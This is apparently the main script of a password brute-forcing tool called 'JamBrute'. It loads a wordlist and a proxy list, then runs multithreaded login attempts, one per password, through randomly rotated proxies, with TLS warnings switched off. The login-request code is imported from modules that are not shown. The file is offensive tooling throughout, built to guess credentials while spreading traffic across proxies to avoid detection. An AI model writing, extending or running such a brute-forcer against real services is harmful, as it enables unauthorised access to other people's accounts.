from concurrent.futures import ThreadPoolExecutor 
import random
import colorama
from colorama import Fore
import pyfiglet
from termcolor import colored
import urllib3
from src.login_reqs import LoginRequests
from src.wordlist import Wordlist
from src.proxyloader import ProxyLoader

def start() -> None:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    colorama.init(autoreset = True)
    
    # ascii banner
    text = "JamBrute"
    ascii_art = pyfiglet.figlet_format(text, font="standard", width = 150)
    print(colored(ascii_art, 'red'))

    
    # initialize objects 
    login = LoginRequests()
    wordlist = Wordlist()
    proxy_list = ProxyLoader()
    proxy_list.load_proxies() 
    wordlist.open_wordlist()
    
    # execute threads
    max_concurrent_workers = 4
    with ThreadPoolExecutor(max_workers = max_concurrent_workers) as worker:
        for password in wordlist.passwords: # iterate through the wordlist array of passwords
            proxy = random.choice(proxy_list.proxy_list) if proxy_list.proxy_list else None # random selection from list
            worker.submit(login.send_login, password, proxy) # submit the threads to executor with login method and password +proxy parameters
    



if __name__ == "__main__":
    start() # start call
    